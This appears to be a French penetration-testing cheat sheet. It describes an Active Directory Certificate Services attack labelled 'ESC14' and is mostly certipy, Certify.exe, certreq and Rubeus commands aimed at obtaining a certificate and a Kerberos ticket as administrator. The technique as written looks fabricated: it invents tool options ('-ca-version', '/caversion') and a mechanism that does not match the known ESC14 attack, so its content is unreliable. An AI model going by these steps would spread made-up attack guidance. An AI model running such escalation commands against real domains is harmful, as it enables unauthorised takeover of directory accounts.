### Description

ESC14 exploite des modèles de certificats qui utilisent des attributs `szOID_CERTSRV_CA_VERSION` ou des extensions de version CA malformées, permettant à un attaquant de créer des certificats avec des informations de version CA manipulées qui peuvent contourner certaines vérifications de validation ou être utilisées pour l'usurpation d'autorité de certification.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC14 si :

1. **Extensions de version CA manipulables** - Le modèle permet la modification des attributs `szOID_CERTSRV_CA_VERSION`
2. **Validation insuffisante des extensions** - La CA n'effectue pas de validation stricte des extensions de version
3. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
4. **Contournement possible des vérifications** - Les applications clientes acceptent des versions CA malformées

---

### Exploitation depuis linux (certipy)

Enumération des templates avec extensions de version vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec focus sur les extensions CA
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des templates avec CA version extensions
certipy find -u user@domain.local -p password -target dc01.domain.local -vulnerable | grep -A10 -B5 "CA.*Version\|szOID_CERTSRV"
```

Exploitation avec manipulation de version CA :

```bash
# Demande d'un certificat avec version CA manipulée
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'CAVersionTemplate' -ca-version "2.0.fake.version"

# Avec forge d'attributs CA spécifiques
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'VersionTemplate' -ca-version "1.0" -ca-info "Fake CA Information"
```

Exploitation avec certificat de CA usurpée :

```bash
# Tentative de création d'un certificat se faisant passer pour une autre CA
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'CAVersionTemplate' -upn administrator@domain.local -ca-version "Enterprise-Root-CA-v1.0"
```

Authentification avec le certificat manipulé :

```bash
# Authentification avec le certificat à version CA falsifiée
certipy auth -pfx user.pfx -username user -domain domain.local -dc-ip 192.168.1.10

# Si usurpation CA réussie
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC14 - CA version extensions
Certify.exe find /vulnerable | findstr "CA.*Version\|szOID_CERTSRV"

# Vérification manuelle des extensions CA
Get-ADObject -Filter {objectClass -eq "pKICertificateTemplate"} -Properties * | Where-Object {
    $_.'msPKI-Certificate-Name-Flag' -ne $null -or $_.'msPKI-Minimal-Key-Size' -ne $null
} | ForEach-Object {
    certutil -v -template $_.Name | findstr "CA.*Version\|Extension"
}
```

Exploitation du template vulnérable :

```powershell
# Demande d'un certificat avec version CA manipulée
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:CAVersionTemplate /caversion:"2.0.malicious"

# Avec attributs CA personnalisés
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:VersionTemplate /caversion:"Enterprise-Root-v1.0" /altname:administrator@domain.local
```

Manipulation via certreq avec INF personnalisé :

```powershell
# Création d'un fichier INF avec version CA manipulée
@"
[NewRequest]
Subject = "CN=user,OU=Users,DC=domain,DC=local"
KeyUsage = DigitalSignature,KeyEncipherment
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
KeyLength = 2048
RequestType = PKCS10

[Extensions]
1.3.6.1.4.1.311.21.1 = "{text}2.0.fake.ca.version"
1.3.6.1.4.1.311.21.2 = "{text}Malicious CA Info"
"@ | Out-File -FilePath "malicious_request.inf" -Encoding ASCII

# Soumission de la demande
certreq -new malicious_request.inf malicious_request.req
certreq -submit -config "DC01.domain.local\domain-DC01-CA" malicious_request.req malicious_cert.cer
```

Authentification avec le certificat obtenu :

```powershell
# Conversion du certificat si nécessaire
certutil -mergePFX malicious_cert.cer,private_key.key malicious_cert.pfx

# Authentification avec le certificat 
Rubeus.exe asktgt /user:user /certificate:malicious_cert.pfx /password:password123 /ptt

# Test d'usurpation si version CA acceptée
Rubeus.exe asktgt /user:administrator /certificate:malicious_cert.pfx /password:password123 /ptt
```